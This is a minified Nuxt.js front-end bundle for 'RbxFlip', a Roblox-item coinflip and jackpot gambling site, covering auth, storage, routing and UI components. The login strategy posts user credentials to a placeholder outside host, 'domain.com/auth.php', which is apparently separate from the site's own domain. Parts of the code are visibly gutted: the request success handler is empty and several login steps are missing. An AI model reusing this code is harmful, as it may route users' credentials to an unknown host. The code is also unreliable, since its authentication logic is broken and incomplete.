                            preserveState: Boolean(this.ctx.store.state[this.options.vuex.namespace])
                        }), this.state = this.ctx.store.state[this.options.vuex.namespace]
                    } else c.default.set(this, "state", {})
                }
            }, {
                key: "setState",
                value: function(t, e) {
                    return "_" === t[0] ? c.default.set(this._state, t, e) : this._useVuex ? this.ctx.store.commit(this.options.vuex.namespace + "/SET", {
                        key: t,
                        value: e
                    }) : c.default.set(this.state, t, e), e
                }
            }, {
                key: "getState",
                value: function(t) {
                    return "_" !== t[0] ? this.state[t] : this._state[t]
                }
            }, {
                key: "watchState",
                value: function(t, e) {
                    var r = this;
                    if (this._useVuex) return this.ctx.store.watch((function(e) {
                        return Be(e[r.options.vuex.namespace], t)
                    }), e)
                }
            }, {
                key: "removeState",
                value: function(t) {
                    this.setState(t, void 0)
                }
            }, {
                key: "setLocalStorage",
                value: function(t, e) {
                    if (De(e)) return this.removeLocalStorage(t);
                    if ("undefined" != typeof localStorage && this.options.localStorage) {
                        var r = this.options.localStorage.prefix + t;
                        try {
                            localStorage.setItem(r, qe(e))
                        } catch (t) {
                            if (!this.options.ignoreExceptions) throw t
                        }
                        return e
                    }
                }
            }, {
                key: "getLocalStorage",
                value: function(t) {
                    if ("undefined" != typeof localStorage && this.options.localStorage) {
                        var e = this.options.localStorage.prefix + t;
                        return We(localStorage.getItem(e))
                    }
                }
            }, {
                key: "removeLocalStorage",
                value: function(t) {
                    if ("undefined" != typeof localStorage && this.options.localStorage) {
                        var e = this.options.localStorage.prefix + t;
                        localStorage.removeItem(e)
                    }
                }
            }, {
                key: "getCookies",
                value: function() {
                    var t = document.cookie;
                    return Object(Ue.parse)(t || "") || {}
                }
            }, {
                key: "setCookie",
                value: function(t, e) {
                    var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    if (this.options.cookie) {
                        var n = this.options.cookie.prefix + t,
                            o = Object.assign({}, this.options.cookie.options, r),
                            c = qe(e);
                        De(e) && (o.maxAge = -1), "number" == typeof o.expires && (o.expires = new Date(1 * new Date + 864e5 * o.expires));
                        var l = Object(Ue.serialize)(n, c, o);
                        return document.cookie = l, e
                    }
                }
            }, {
                key: "getCookie",
                value: function(t) {
                    if (this.options.cookie) {
                        var e = this.options.cookie.prefix + t,
                            r = this.getCookies();
                        return We(r[e] ? decodeURIComponent(r[e]) : void 0)
                    }
                }
            }, {
                key: "removeCookie",
                value: function(t, e) {
                    this.setCookie(t, void 0, e)
                }
            }]), t
        }();

        function Ge(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return Ye(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return Ye(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, c = !0,
                l = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return c = t.done, t
                },
                e: function(t) {
                    l = !0, o = t
                },
                f: function() {
                    try {
                        c || null == r.return || r.return()
                    } finally {
                        if (l) throw o
                    }
                }
            }
        }

        function Ye(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }
        var Ke = function() {
            function t(e, r) {
                Object(Te.a)(this, t), this.ctx = e, this.options = r, this.strategies = {}, this._errorListeners = [], this._redirectListeners = [], r.initialState = {
                    user: null,
                    loggedIn: !1
                };
                var n = new Je(e, r);
                this.$storage = n, this.$state = n.state
            }
            var e;
            return Object(Ne.a)(t, [{
                key: "init",
                value: (e = Object(n.a)(regeneratorRuntime.mark((function t() {
                    var e = this;
                    return regeneratorRuntime.wrap((function(t) {
                        for (;;) switch (t.prev = t.next) {
                            case 0:
                                if (this.options.resetOnError && this.onError((function() {
                                        var t;
                                        ("function" != typeof e.options.resetOnError || (t = e.options).resetOnError.apply(t, arguments)) && e.reset()
                                    })), this.$storage.syncUniversal("strategy", this.options.defaultStrategy), this.strategy) {
                                    t.next = 6;
                                    break
                                }
                                if (this.$storage.setUniversal("strategy", this.options.defaultStrategy), this.strategy) {
                                    t.next = 6;
                                    break
                                }
                                return t.abrupt("return", Promise.resolve());
                            case 6:
                                return t.prev = 6, t.next = 9, this.mounted();
                            case 9:
                                t.next = 14;
                                break;
                            case 11:
                                t.prev = 11, t.t0 = t.catch(6), this.callOnError(t.t0);
                            case 14:
                                return t.prev = 14, this.options.watchLoggedIn && this.$storage.watchState("loggedIn", (function(t) {
                                    Ve(e.ctx.route, "auth", !1) || e.redirect(t ? "home" : "logout")
                                })), t.finish(14);
                            case 17:
                            case "end":
                                return t.stop()
                        }
                    }), t, this, [
                        [6, 11, 14, 17]
                    ])
                }))), function() {
                    return e.apply(this, arguments)
                })
            }, {
                key: "getState",
                value: function(t) {
                    return this._get_state_warn_shown || (this._get_state_warn_shown = !0, console.warn("[AUTH] $auth.getState is deprecated. Please use $auth.$storage.getState() or top level props like $auth.loggedIn")), this.$storage.getState(t)
                }
            }, {
                key: "registerStrategy",
                value: function(t, e) {
                    this.strategies[t] = e
                }
            }, {
                key: "setStrategy",
                value: function(t) {
                    return t === this.$storage.getUniversal("strategy") ? Promise.resolve() : (this.$storage.setUniversal("strategy", t), this.mounted())
                }
            }, {
                key: "mounted",
                value: function() {
                    var t, e = this;
                    return this.strategy.mounted ? Promise.resolve((t = this.strategy).mounted.apply(t, arguments)).catch((function(t) {
                        return e.callOnError(t, {
                            method: "mounted"
                        }), Promise.reject(t)
                    })) : this.fetchUserOnce()
                }
            }, {
                key: "loginWith",
                value: function(t) {
                    for (var e = this, r = arguments.length, n = new Array(r > 1 ? r - 1 : 0), o = 1; o < r; o++) n[o - 1] = arguments[o];
                    return this.setStrategy(t).then((function() {
                        return e.login.apply(e, n)
                    }))
                }
            }, {
                key: "login",
                value: function() {
                    var t, e = this;
                    return this.strategy.login ? this.wrapLogin((t = this.strategy).login.apply(t, arguments)).catch((function(t) {
                        return e.callOnError(t, {
                            method: "login"
                        }), Promise.reject(t)
                    })) : Promise.resolve()
                }
            }, {
                key: "fetchUser",
                value: function() {
                    var t, e = this;
                    return this.strategy.fetchUser ? Promise.resolve((t = this.strategy).fetchUser.apply(t, arguments)).catch((function(t) {
                        return e.callOnError(t, {
                            method: "fetchUser"
                        }), Promise.reject(t)
                    })) : Promise.resolve()
                }
            }, {
                key: "logout",
                value: function() {
                    var t, e = this;
                    return this.strategy.logout ? Promise.resolve((t = this.strategy).logout.apply(t, arguments)).catch((function(t) {
                        return e.callOnError(t, {
                            method: "logout"
                        }), Promise.reject(t)
                    })) : (this.reset(), Promise.resolve())
                }
            }, {
                key: "setUserToken",
                value: function(t) {
                    var e = this;
                    return this.strategy.setUserToken ? Promise.resolve(this.strategy.setUserToken(t)).catch((function(t) {
                        return e.callOnError(t, {
                            method: "setUserToken"
                        }), Promise.reject(t)
                    })) : (this.setToken(this.strategy.name, t), Promise.resolve())
                }
            }, {
                key: "reset",
                value: function() {
                    var t, e = this;
                    return this.strategy.reset ? Promise.resolve((t = this.strategy).reset.apply(t, arguments)).catch((function(t) {
                        return e.callOnError(t, {
                            method: "reset"
                        }), Promise.reject(t)
                    })) : (this.setUser(!1), this.setToken(this.$state.strategy, !1), this.setRefreshToken(this.$state.strategy, !1), Promise.resolve())
                }
            }, {
                key: "getToken",
                value: function(t) {
                    var e = this.options.token.prefix + t;
                    return this.$storage.getUniversal(e)
                }
            }, {
                key: "setToken",
                value: function(t, e) {
                    var r = this.options.token.prefix + t;
                    return this.$storage.setUniversal(r, e)
                }
            }, {
                key: "syncToken",
                value: function(t) {
                    var e = this.options.token.prefix + t;
                    return this.$storage.syncUniversal(e)
                }
            }, {
                key: "getRefreshToken",
                value: function(t) {
                    var e = this.options.refresh_token.prefix + t;
                    return this.$storage.getUniversal(e)
                }
            }, {
                key: "setRefreshToken",
                value: function(t, e) {
                    var r = this.options.refresh_token.prefix + t;
                    return this.$storage.setUniversal(r, e)
                }
            }, {
                key: "syncRefreshToken",
                value: function(t) {
                    var e = this.options.refresh_token.prefix + t;
                    return this.$storage.syncUniversal(e)
                }
            }, {
                key: "fetchUserOnce",
                value: function() {
                    return this.$state.user ? Promise.resolve() : this.fetchUser.apply(this, arguments)
                }
            }, {
                key: "setUser",
                value: function(t) {
                    this.$storage.setState("user", t), this.$storage.setState("loggedIn", Boolean(t))
                }
            }, {
                key: "request",
                value: function(t, e, r) {
                    var n = this,
                        o = "object" === Object(Pe.a)(e) ? Object.assign({}, e, t) : t;
                    if (this.ctx.app.$axios) return this.ctx.app.$axios.request(o).then((function(t) {
                     
                    })).catch((function(t) {
                        return n.callOnError(t, {
                            method: "request"
                        }), Promise.reject(t)
                    }));
                    console.error("[AUTH] add the @nuxtjs/axios module to nuxt.config file")
                }
            }, {
                key: "requestWith",
                value: function(t, e, r, n) {
                    var o = this.getToken(t),
                        c = Object.assign({}, r, e),
                        l = this.strategies[t].options.tokenName || "Authorization";
                    return c.headers || (c.headers = {}), !c.headers[l] && Le(o) && o && (c.headers[l] = o), this.request(c, !1, n)
                }
            }, {
                key: "wrapLogin",
                value: function(t) {
                    var e = this;
                    return this.$storage.setState("busy", !0), this.error = null, Promise.resolve(t).then((function(t) {
                        return e.$storage.setState("busy", !1), t
                    })).catch((function(t) {
                        return e.$storage.setState("busy", !1), Promise.reject(t)
                    }))
                }
            }, {
                key: "onError",
                value: function(t) {
                    this._errorListeners.push(t)
                }
            }, {
                key: "callOnError",
                value: function(t) {
                    var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                    this.error = t;
                    var r, n = Ge(this._errorListeners);
                    try {
                        for (n.s(); !(r = n.n()).done;) {
                            var o = r.value;
                            o(t, e)
                        }
                    } catch (t) {
                        n.e(t)
                    } finally {
                        n.f()
                    }
                }
            }, {
                key: "redirect",
                value: function(t) {
                    var e = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                    if (this.options.redirect) {
                        var r = this.options.fullPathRedirect ? this.ctx.route.fullPath : this.ctx.route.path,
                            n = this.options.redirect[t];
                        if (n) {
                            if (this.options.rewriteRedirects && ("login" === t && Fe(r) && !Me(n, r) && this.$storage.setUniversal("redirect", r), "home" === t)) {
                                var o = this.$storage.getUniversal("redirect");
                                this.$storage.setUniversal("redirect", null), Fe(o) && (n = o)
                            }
                            n = this.callOnRedirect(n, r) || n, Me(n, r) || (e ? window.location.replace(n) : this.ctx.redirect(n, this.ctx.query))
                        }
                    }
                }
            }, {
                key: "onRedirect",
                value: function(t) {
                    this._redirectListeners.push(t)
                }
            }, {
                key: "callOnRedirect",
                value: function(t, e) {
                    var r, n = Ge(this._redirectListeners);
                    try {
                        for (n.s(); !(r = n.n()).done;) {
                            t = (0, r.value)(t, e) || t
                        }
                    } catch (t) {
                        n.e(t)
                    } finally {
                        n.f()
                    }
                    return t
                }
            }, {
                key: "hasScope",
                value: function(t) {
                    var e = this.$state.user && Be(this.$state.user, this.options.scopeKey);
                    return !!e && (Array.isArray(e) ? e.includes(t) : Boolean(Be(e, t)))
                }
            }, {
                key: "state",
                get: function() {
                    return this._state_warn_shown || (this._state_warn_shown = !0, console.warn("[AUTH] $auth.state is deprecated. Please use $auth.$state or top level props like $auth.loggedIn")), this.$state
                }
            }, {
                key: "strategy",
                get: function() {
                    return this.strategies[this.$state.strategy]
                }
            }, {
                key: "user",
                get: function() {
                    return this.$state.user
                }
            }, {
                key: "loggedIn",
                get: function() {
                    return this.$state.loggedIn
                }
            }, {
                key: "busy",
                get: function() {
                    return this.$storage.getState("busy")
                }
            }]), t
        }();
        r(84).a.auth = function(t) {
            if (!Ve(t.route, "auth", !1)) {
                if (function(t) {
                        var e = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                        return [].concat.apply([], t.matched.map((function(t, r) {
                            return Object.keys(t.components).map((function(n) {
                                return e && e.push(r), t.components[n]
                            }))
                        })))
                    }(t.route, []).length) {
                    var e = t.$auth.options.redirect,
                        r = e.login,
                        n = e.callback,
                        o = Ve(t.route, "auth", "guest"),
                        c = function(e) {
                            return ze(t.route.path) === ze(e)
                        };
                    t.$auth.$state.loggedIn ? (!r || c(r) || o) && t.$auth.redirect("home") : o || n && c(n) || t.$auth.redirect("login")
                }
            }
        };
        var He = function() {
                function t(e, r) {
                    Object(Te.a)(this, t), this.$auth = e, this.name = r._name, this.options = Object.assign({}, Xe, r)
                }
                var e, r, o, c, l;
                return Object(Ne.a)(t, [{
                    key: "_setToken",
                    value: function(t) {
                        this.options.globalToken && this.$auth.ctx.app.$axios.setHeader(this.options.tokenName, t)
                    }
                }, {
                    key: "_clearToken",
                    value: function() {
                        this.options.globalToken && this.$auth.ctx.app.$axios.setHeader(this.options.tokenName, !1)
                    }
                }, {
                    key: "mounted",
                    value: function() {
                        if (this.options.tokenRequired) {
                            var t = this.$auth.syncToken(this.name);
                            this._setToken(t)
                        }
                        return this.$auth.fetchUserOnce()
                    }
                }, {
                    key: "login",
                    value: (l = Object(n.a)(regeneratorRuntime.mark((function t(e) {
                        var r, n, o, c;
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    if (this.options.endpoints.login) {
                                        t.next = 2;
                                        break
                                    }
                                    return t.abrupt("return");
                                case 2:
                                    return t.next = 4, this.$auth.reset();
                                case 4:
                                    return t.next = 6, this.$auth.request(e, this.options.endpoints.login, !0);
                               
                                case 13:
                                    return t.abrupt("return", n);
                                case 14:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this)
                    }))), function(t) {
                        return l.apply(this, arguments)
                    })
                }, {
                    key: "setUserToken",
                    value: (c = Object(n.a)(regeneratorRuntime.mark((function t(e) {
                        var r;
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    return r = this.options.tokenType ? this.options.tokenType + " " + e : e, this.$auth.setToken(this.name, r), this._setToken(r), t.abrupt("return", this.fetchUser());
                                case 4:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this)
                    }))), function(t) {
                        return c.apply(this, arguments)
                    })
                }, {
                    key: "fetchUser",
                    value: (o = Object(n.a)(regeneratorRuntime.mark((function t(e) {
                        var r;
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    if (!this.options.tokenRequired || this.$auth.getToken(this.name)) {
                                        t.next = 2;
                                        break
                                    }
                                    return t.abrupt("return");
                                case 2:
                                    if (this.options.endpoints.user) {
                                        t.next = 5;
                                        break
                                    }
                                    return this.$auth.setUser({}), t.abrupt("return");
                                case 5:
                                    return t.next = 7, this.$auth.requestWith(this.name, e, this.options.endpoints.user);
                                case 7:
                                    r = t.sent, this.$auth.setUser(r);
                                case 9:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this)
                    }))), function(t) {
                        return o.apply(this, arguments)
                    })
                }, {
                    key: "logout",
                    value: (r = Object(n.a)(regeneratorRuntime.mark((function t(e) {
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    if (!this.options.endpoints.logout) {
                                        t.next = 3;
                                        break
                                    }
                                    return t.next = 3, this.$auth.requestWith(this.name, e, this.options.endpoints.logout).catch((function() {}));
                                case 3:
                                    return t.abrupt("return", this.$auth.reset());
                                case 4:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this)
                    }))), function(t) {
                        return r.apply(this, arguments)
                    })
                }, {
                    key: "reset",
                    value: (e = Object(n.a)(regeneratorRuntime.mark((function t() {
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    return this.options.tokenRequired && this._clearToken(), this.$auth.setUser(!1), this.$auth.setToken(this.name, !1), this.$auth.setRefreshToken(this.name, !1), t.abrupt("return", Promise.resolve());
                                case 5:
                                case "end":
                                    return t.stop()
                            }
                        }), t, this)
                    }))), function() {
                        return e.apply(this, arguments)
                    })
                }]), t
            }(),
            Xe = {
                tokenRequired: !0,
                tokenType: "Bearer",
                globalToken: !0,
                tokenName: "Authorization",
                autoFetchUser: !0
            },
            Qe = function(t, e) {
                var r = new Ke(t, {
                    resetOnError: !1,
                    scopeKey: "scope",
                    rewriteRedirects: !0,
                    fullPathRedirect: !1,
                    watchLoggedIn: !0,
                    redirect: {
                        login: "/claims",
                        logout: "/",
                        home: "/",
                        callback: "/claims"
                    },
                    vuex: {
                        namespace: "auth"
                    },
                    cookie: {
                        prefix: "auth.",
                        options: {
                            path: "/"
                        }
                    },
                    localStorage: {
                        prefix: "auth."
                    },
                    token: {
                        prefix: "_token."
                    },
                    refresh_token: {
                        prefix: "_refresh_token."
                    },
                    defaultStrategy: "local"
                });
                return r.registerStrategy("local", new He(r, {
                    endpoints: {
                        login: {
                            url: "https://domain.com/auth.php",
                            method: "post",
                            propertyName: "data.jwToken"
                        },
                        logout: null,
                        user: {
                            url: "/auth/user",
                            method: "get",
                            propertyName: "data.user"
                        }
                    },
                    _name: "local"
                })), e("auth", r), t.$auth = r, r.init().catch((function(t) {
                    console.error("[ERROR] [AUTH]", t)
                }))
            };

        function Ze(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function ta(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? Ze(Object(source), !0).forEach((function(e) {
                    Object(o.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : Ze(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }
        c.default.component(f.a.name, f.a), c.default.component(h.a.name, ta(ta({}, h.a), {}, {
            render: function(t, e) {
                return h.a._warned || (h.a._warned = !0, console.warn("<no-ssr> has been deprecated and will be removed in Nuxt 3, please use <client-only> instead")), h.a.render(t, e)
            }
        })), c.default.component(Ut.name, Ut), c.default.component("NChild", Ut), c.default.component(zt.name, zt), c.default.use(l.a, {
            keyName: "head",
            attribute: "data-n-head",
            ssrAttribute: "data-n-head-ssr",
            tagIDKeyName: "hid"
        });
        var ea = {
            name: "page",
            mode: "out-in",
            appear: !0,
            appearClass: "appear",
            appearActiveClass: "appear-active",
            appearToClass: "appear-to"
        };

        function aa(t) {
            return ra.apply(this, arguments)
        }

        function ra() {
            return (ra = Object(n.a)(regeneratorRuntime.mark((function t(e) {
                var r, n, o, l, d, f, path, m, h = arguments;
                return regeneratorRuntime.wrap((function(t) {
                    for (;;) switch (t.prev = t.next) {
                        case 0:
                            return m = function(t, e) {
                                if (!t) throw new Error("inject(key, value) has no key provided");
                                if (void 0 === e) throw new Error("inject('".concat(t, "', value) has no value provided"));
                                l[t = "$" + t] = e, l.context[t] || (l.context[t] = e), o[t] = l[t];
                                var r = "__nuxt_" + t + "_installed__";
                                c.default[r] || (c.default[r] = !0, c.default.use((function() {
                                    Object.prototype.hasOwnProperty.call(c.default.prototype, t) || Object.defineProperty(c.default.prototype, t, {
                                        get: function() {
                                            return this.$root.$options[t]
                                        }
                                    })
                                })))
                            }, r = h.length > 1 && void 0 !== h[1] ? h[1] : {}, t.next = 4, Nt();
                        case 4:
                            return n = t.sent, (o = Xt(e)).$router = n, l = ta({
                                head: {
                                    title: "RbxFlip | Roblox Coinflip & Jackpot",
                                    meta: [{
                                        charset: "utf-8"
                                    }, {
                                        "http-equiv": "x-ua-compatible",
                                        content: "ie=edge,chrome=1"
                                    }, {
                                        name: "viewport",
                                        content: "width=device-width,initial-scale=1"
                                    }, {
                                        name: "og:type",
                                        content: "website"
                                    }, {
                                        name: "description",
                                        content: "Provably fair gambling through coinflip & jackpot using Roblox limiteds"
                                    }, {
                                        name: "og:title",
                                        content: "RbxFlip | Roblox Coinflip & Jackpot"
                                    }, {
                                        name: "og:site_name",
                                        content: "RbxFlip"
                                    }, {
                                        name: "og:description",
                                        content: "Provably fair gambling through coinflip & jackpot using Roblox limiteds"
                                    }, {
                                        name: "og:url",
                                        content: "https://rbxflip.com/"
                                    }, {
                                        name: "og:image",
                                        content: "/img/logos/primary.png"
                                    }],
                                    link: [{
                                        rel: "icon",
                                        href: "/favicon.png",
                                        type: "image/png"
                                    }, {
                                        rel: "stylesheet",
                                        href: "https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;700&display=swap"
                                    }, {
                                        rel: "prefetch",
                                        href: "/img/coins/heads.png",
                                        as: "image"
                                    }, {
                                        rel: "prefetch",
                                        href: "/img/coins/tails.png",
                                        as: "image"
                                    }, {
                                        rel: "prefetch",
                                        href: "/img/spritesheets/peak_heads_land_heads.png",
                                        as: "image"
                                    }, {
                                        rel: "prefetch",
                                        href: "/img/spritesheets/peak_heads_land_tails.png",
                                        as: "image"
                                    }, {
                                        rel: "prefetch",
                                        href: "/img/spritesheets/peak_tails_land_tails.png",
                                        as: "image"
                                    }, {
                                        rel: "prefetch",
                                        href: "/img/spritesheets/peak_tails_land_heads.png",
                                        as: "image"
                                    }],
                                    htmlAttrs: {
                                        lang: "en"
                                    },
                                    style: [],
                                    script: []
                                },
                                store: o,
                                router: n,
                                nuxt: {
                                    defaultTransition: ea,
                                    transitions: [ea],
                                    setTransitions: function(t) {
                                        return Array.isArray(t) || (t = [t]), t = t.map((function(t) {
                                            return t = t ? "string" == typeof t ? Object.assign({}, ea, {
                                                name: t
                                            }) : Object.assign({}, ea, t) : ea
                                        })), this.$options.nuxt.transitions = t, t
                                    },
                                    err: null,
                                    dateErr: null,
                                    error: function(t) {
                                        t = t || null, l.context._errored = Boolean(t), t = t ? Object(Vt.o)(t) : null;
                                        var r = l.nuxt;
                                        return this && (r = this.nuxt || this.$options.nuxt), r.dateErr = Date.now(), r.err = t, e && (e.nuxt.error = t), t
                                    }
                                }
                            }, Kt), o.app = l, d = e ? e.next : function(t) {
                                return l.router.push(t)
                            }, e ? f = n.resolve(e.url).route : (path = Object(Vt.f)(n.options.base, n.options.mode), f = n.resolve(path).route), t.next = 13, Object(Vt.s)(l, {
                                store: o,
                                route: f,
                                next: d,
                                error: l.nuxt.error.bind(l),
                                payload: e ? e.payload : void 0,
                                req: e ? e.req : void 0,
                                res: e ? e.res : void 0,
                                beforeRenderFns: e ? e.beforeRenderFns : void 0,
                                ssrContext: e
                            });
                        case 13:
                            m("config", r), window.__NUXT__ && window.__NUXT__.state && o.replaceState(window.__NUXT__.state), l.context.enablePreview = function() {
                                var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                                l.previewData = Object.assign({}, t), m("preview", t)
                            }, t.next = 19;
                            break;
                        case 19:
                            return t.next = 22, pe(l.context, m);
                        case 22:
                            if ("function" != typeof ve) {
                                t.next = 25;
                                break
                            }
                            return t.next = 25, ve(l.context, m);
                        case 25:
                            t.next = 28;
                            break;
                        case 28:
                            t.next = 31;
                            break;
                        case 31:
                            t.next = 34;
                            break;
                        case 34:
                            return t.next = 37, Ce(l.context);
                        case 37:
                            return t.next = 40, Ae(l.context);
                        case 40:
                            t.next = 43;
                            break;
                        case 43:
                            t.next = 46;
                            break;
                        case 46:
                            t.next = 49;
                            break;
                        case 49:
                            t.next = 52;
                            break;
                        case 52:
                            return t.next = 55, Qe(l.context, m);
                        case 55:
                            l.context.enablePreview = function() {
                                console.warn("You cannot call enablePreview() outside a plugin.")
                            }, t.next = 59;
                            break;
                        case 59:
                            return t.abrupt("return", {
                                store: o,
                                app: l,
                                router: n
                            });
                        case 60:
                        case "end":
                            return t.stop()
                    }
                }), t)
            })))).apply(this, arguments)
        }
    }, , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    containerWidth: {
                        type: null | String,
                        default: null
                    }
                },
                methods: {
                    closeModal: function(t) {
                        t ? this.$router.push("/".concat(localStorage.getItem("currentPage"))) : this.$router.go(-1)
                    }
                }
            },
            o = (r(343), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "outer"
                }, [r("div", {
                    staticClass: "modal"
                }, [r("div", {
                    staticClass: "modal__background",
                    on: {
                        click: function(e) {
                            return t.closeModal(!0)
                        }
                    }
                }), t._v(" "), r("div", {
                    staticClass: "modal__container",
                    style: {
                        width: t.containerWidth
                    }
                }, [r("div", {
                    staticClass: "container__body"
                }, [r("div", {
                    staticClass: "body__close",
                    on: {
                        click: function(e) {
                            return t.closeModal(!1)
                        }
                    }
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "times"]
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "body__dialogue"
                }, [t._t("default")], 2)])])])])
            }), [], !1, null, "c9d29e7c", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(40), r(43), r(8);
        var n = r(2),
            o = (r(359), {
                props: {
                    path: {
                        type: String,
                        required: !0
                    },
                    property: {
                        type: String,
                        required: !0
                    }
                },
                data: function() {
                    return {
                        isEmpty: !1
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, data, n;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    if (e.prev = 0, !t.path.includes(".", "..")) {
                                        e.next = 3;
                                        break
                                    }
                                    throw new Error("Something went wrong!");
                                case 3:
                                    return e.next = 5, t.$axios.$get(t.path);
                                case 5:
                                    r = e.sent, data = r.data, (n = data[t.property]) && (n instanceof Array && n.length < 1 ? t.isEmpty = !0 : t.$emit("input", n)), e.next = 14;
                                    break;
                                case 11:
                                    e.prev = 11, e.t0 = e.catch(0), console.error(e.t0);
                                case 14:
                                case "end":
                                    return e.stop()
                            }
                        }), e, null, [
                            [0, 11]
                        ])
                    })))()
                },
                fetchDelay: 2e3,
                fetchOnServer: !1,
                watch: {
                    "$route.params": "$fetch"
                }
            }),
            c = (r(360), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("ModalContainer", [e("Brand", {
                    staticClass: "fetch-branding",
                    attrs: {
                        "logo-width": "200px",
                        "logo-version": "teritiary"
                    }
                }), this._v(" "), this.$fetchState.pending ? e("div", [e("Spinner")], 1) : e("div", [this.$fetchState.error ? e("div", [e("span", [this._v("Failed to fetch data")])]) : e("div", [this.isEmpty ? e("div", [e("span", [this._v("No results")])]) : this._t("default")], 2)])], 1)
            }), [], !1, null, "2c6716b7", null);
        e.default = component.exports;
        installComponents(component, {
            Brand: r(98).default,
            Spinner: r(51).default,
            ModalContainer: r(60).default
        })
    }, , , , , , , , , , , , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        var n = {};
        n.admin = r(278), n.admin = n.admin.default || n.admin, e.a = n
    }, , , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    logoVersion: {
                        type: String,
                        default: "primary"
                    },
                    logoWidth: {
                        type: String,
                        default: "100px"
                    }
                }
            },
            o = (r(311), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "brand"
                }, [e("NuxtLink", {
                    staticClass: "grid",
                    attrs: {
                        to: "/"
                    }
                }, [e("img", {
                    attrs: {
                        clsas: "mx-auto",
                        src: "/img/logos/" + this.logoVersion + ".png",
                        width: this.logoWidth,
                        height: "auto"
                    }
                })])], 1)
            }), [], !1, null, "71da751d", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(44);
        var n = {
                props: {
                    label: {
                        type: String,
                        required: !0
                    },
                    value: {
                        type: Number | String | Boolean,
                        required: !0
                    },
                    prefix: {
                        type: null | String,
                        default: null
                    }
                }
            },
            o = (r(327), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("li", {
                    staticClass: "stat-list__item"
                }, [r("span", {
                    staticClass: "item__label"
                }, [t._v(t._s(t.label))]), t._v(" "), r("span", {
                    staticClass: "item__value"
                }, [t.prefix ? r("span", [t._v(t._s(t.prefix))]) : t._e(), t._v(" "), "string" == typeof t.value ? r("span", [t._v(t._s(t.value))]) : t._e(), t._v(" "), "number" == typeof t.value ? r("span", [t._v(t._s(t._f("longNumber")(t.value)))]) : t._e(), t._v(" "), "boolean" == typeof t.value ? r("span", [r("input", {
                    staticClass: "form-checkbox form-checkbox-dark",
                    attrs: {
                        type: "checkbox",
                        disabled: ""
                    },
                    domProps: {
                        checked: t.value
                    }
                })]) : t._e()])])
            }), [], !1, null, "be8bf7be", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    placeholder: {
                        type: String,
                        default: ""
                    }
                }
            },
            o = (r(331), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement;
                return (t._self._c || e)("input", {
